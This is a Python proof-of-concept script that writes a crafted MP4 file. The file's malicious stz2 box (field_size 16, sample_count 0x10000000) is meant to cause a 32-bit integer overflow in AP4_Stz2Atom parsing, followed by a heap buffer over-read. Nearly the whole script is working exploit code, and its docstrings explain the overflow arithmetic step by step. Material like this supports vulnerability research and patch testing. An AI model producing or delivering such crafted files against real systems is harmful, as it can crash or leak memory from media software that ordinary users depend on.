#!/usr/bin/env python3
"""
PoC generator for VULN 001 - AP4_Stz2Atom Integer Overflow -> Heap Buffer Over-read

In Ap4Stz2Atom.cpp, when field_size=16 and sample_count=0x10000000:
  table_size = (0x10000000 * 16 + 7) / 8 = (0x100000000 + 7) / 8
  0x100000000 truncates to 0 in 32-bit arithmetic, so table_size = 0
  The check (0 + 8) > actual_payload_size is bypassed
  A 0-byte buffer is allocated, then 0x10000000 entries are read from it -> OOB read
"""

import struct
import os

OUTPUT_DIR = os.path.dirname(os.path.abspath(__file__))
OUTPUT_FILE = os.path.join(OUTPUT_DIR, "vuln_001.mp4")


def box(box_type, payload):
    """Create an MP4 box: 4-byte size (BE) + 4-byte type + payload"""
    if isinstance(box_type, str):
        box_type = box_type.encode('ascii')
    size = 8 + len(payload)
    return struct.pack('>I', size) + box_type + payload


def fullbox(box_type, version, flags, payload):
    """Create a fullbox (box with version and flags)"""
    return box(box_type, struct.pack('>B', version) + struct.pack('>I', flags)[1:] + payload)


def make_ftyp():
    payload = b'isom'          # major_brand
    payload += struct.pack('>I', 0x200)  # minor_version
    payload += b'isom'         # compatible_brands[0]
    payload += b'iso2'         # compatible_brands[1]
    payload += b'mp41'         # compatible_brands[2]
    return box('ftyp', payload)


def make_mvhd():
    # version=0, flags=0
    payload = struct.pack('>I', 0)        # creation_time
    payload += struct.pack('>I', 0)       # modification_time
    payload += struct.pack('>I', 1000)    # timescale
    payload += struct.pack('>I', 1000)    # duration
    payload += struct.pack('>I', 0x00010000)  # rate (1.0)
    payload += struct.pack('>H', 0x0100)  # volume (1.0)
    payload += b'\x00' * 10              # reserved
    payload += struct.pack('>I', 0x00010000) + struct.pack('>I', 0) + struct.pack('>I', 0)  # matrix row 1
    payload += struct.pack('>I', 0) + struct.pack('>I', 0x00010000) + struct.pack('>I', 0)  # matrix row 2
    payload += struct.pack('>I', 0) + struct.pack('>I', 0) + struct.pack('>I', 0x40000000)  # matrix row 3
    payload += b'\x00' * 24             # pre_defined
    payload += struct.pack('>I', 2)     # next_track_ID
    return fullbox('mvhd', 0, 0, payload)


def make_tkhd():
    # version=0, flags=3 (track enabled + in movie)
    payload = struct.pack('>I', 0)        # creation_time
    payload += struct.pack('>I', 0)       # modification_time
    payload += struct.pack('>I', 1)       # track_ID
    payload += struct.pack('>I', 0)       # reserved
    payload += struct.pack('>I', 1000)    # duration
    payload += b'\x00' * 8               # reserved
    payload += struct.pack('>H', 0)       # layer
    payload += struct.pack('>H', 0)       # alternate_group
    payload += struct.pack('>H', 0x0100) # volume
    payload += struct.pack('>H', 0)       # reserved
    payload += struct.pack('>I', 0x00010000) + struct.pack('>I', 0) + struct.pack('>I', 0)  # matrix row 1
    payload += struct.pack('>I', 0) + struct.pack('>I', 0x00010000) + struct.pack('>I', 0)  # matrix row 2
    payload += struct.pack('>I', 0) + struct.pack('>I', 0) + struct.pack('>I', 0x40000000)  # matrix row 3
    payload += struct.pack('>I', 0)       # width
    payload += struct.pack('>I', 0)       # height
    return fullbox('tkhd', 0, 3, payload)


def make_mdhd():
    payload = struct.pack('>I', 0)        # creation_time
    payload += struct.pack('>I', 0)       # modification_time
    payload += struct.pack('>I', 44100)   # timescale (audio)
    payload += struct.pack('>I', 44100)   # duration
    payload += struct.pack('>H', 0x55C4) # language (und)
    payload += struct.pack('>H', 0)       # pre_defined
    return fullbox('mdhd', 0, 0, payload)


def make_hdlr():
    payload = struct.pack('>I', 0)        # pre_defined
    payload += b'soun'                    # handler_type
    payload += b'\x00' * 12              # reserved
    payload += b'Sound Handler\x00'      # name
    return fullbox('hdlr', 0, 0, payload)


def make_smhd():
    payload = struct.pack('>H', 0)        # balance
    payload += struct.pack('>H', 0)       # reserved
    return fullbox('smhd', 0, 0, payload)


def make_dref():
    # url entry
    url_payload = b'\x00'   # name (empty, self-contained)
    url_entry = fullbox('url ', 0, 1, url_payload)
    dref_payload = struct.pack('>I', 1) + url_entry  # entry_count=1
    return fullbox('dref', 0, 0, dref_payload)


def make_dinf():
    return box('dinf', make_dref())


def make_stsd():
    # minimal audio sample entry (mp4a)
    # SampleEntry: 6 bytes reserved + 2 bytes data_ref_index
    se_reserved = b'\x00' * 6
    se_data_ref = struct.pack('>H', 1)
    # AudioSampleEntry fields
    audio_reserved = b'\x00' * 8
    channel_count = struct.pack('>H', 2)
    sample_size = struct.pack('>H', 16)
    pre_defined = struct.pack('>H', 0)
    reserved2 = struct.pack('>H', 0)
    sample_rate = struct.pack('>I', 44100 << 16)
    mp4a_payload = se_reserved + se_data_ref + audio_reserved + channel_count + sample_size + pre_defined + reserved2 + sample_rate
    mp4a_box = box('mp4a', mp4a_payload)
    stsd_payload = struct.pack('>I', 1) + mp4a_box  # entry_count=1
    return fullbox('stsd', 0, 0, stsd_payload)


def make_stts():
    # entry_count = 0
    return fullbox('stts', 0, 0, struct.pack('>I', 0))


def make_stsc():
    # entry_count = 0
    return fullbox('stsc', 0, 0, struct.pack('>I', 0))


def make_stsz():
    # sample_size=0, sample_count=0
    payload = struct.pack('>I', 0)   # sample_size
    payload += struct.pack('>I', 0)  # sample_count
    return fullbox('stsz', 0, 0, payload)


def make_stco():
    # entry_count = 0
    return fullbox('stco', 0, 0, struct.pack('>I', 0))


def make_stz2():
    """
    Craft the malicious stz2 box.

    field_size=16, sample_count=0x10000000

    Integer overflow:
      table_size = (0x10000000 * 16 + 7) / 8
                 = (0x100000000 + 7) / 8  <- overflow! truncates to (0 + 7) / 8 = 0

    So table_size=0, 0-byte buffer allocated, then loop reads 0x10000000 entries -> OOB

    Box layout (20 bytes total):
      4B size + 4B type + 4B version/flags + 3B reserved + 1B field_size + 4B sample_count
    No entry data provided.
    """
    box_type = bytes([0x73, 0x74, 0x7A, 0x32])  # 'stz2'
    version = 0
    flags = 0
    reserved = b'\x00\x00\x00'
    field_size = 16  # critical: causes overflow when multiplied by 0x10000000
    sample_count = 0x10000000  # critical: 268435456 samples

    payload = struct.pack('>B', version)
    payload += struct.pack('>I', flags)[1:]   # 3 bytes flags
    payload += reserved
    payload += struct.pack('>B', field_size)
    payload += struct.pack('>I', sample_count)
    # NO entry data - to trigger OOB read from zero-byte buffer

    size = 8 + len(payload)
    return struct.pack('>I', size) + box_type + payload


def make_stbl():
    payload = make_stsd()
    payload += make_stts()
    payload += make_stsc()
    payload += make_stsz()
    payload += make_stco()
    payload += make_stz2()   # malicious box
    return box('stbl', payload)


def make_minf():
    payload = make_smhd()
    payload += make_dinf()
    payload += make_stbl()
    return box('minf', payload)


def make_mdia():
    payload = make_mdhd()
    payload += make_hdlr()
    payload += make_minf()
    return box('mdia', payload)


def make_trak():
    payload = make_tkhd()
    payload += make_mdia()
    return box('trak', payload)


def make_moov():
    payload = make_mvhd()
    payload += make_trak()
    return box('moov', payload)


def main():
    mp4_data = make_ftyp()
    mp4_data += make_moov()

    with open(OUTPUT_FILE, 'wb') as f:
        f.write(mp4_data)

    print(f"Written {len(mp4_data)} bytes to {OUTPUT_FILE}")
    print(f"stz2 box: field_size=16, sample_count=0x10000000")
    print(f"Expected: integer overflow -> table_size=0 -> heap buffer over-read")


if __name__ == '__main__':
    main()
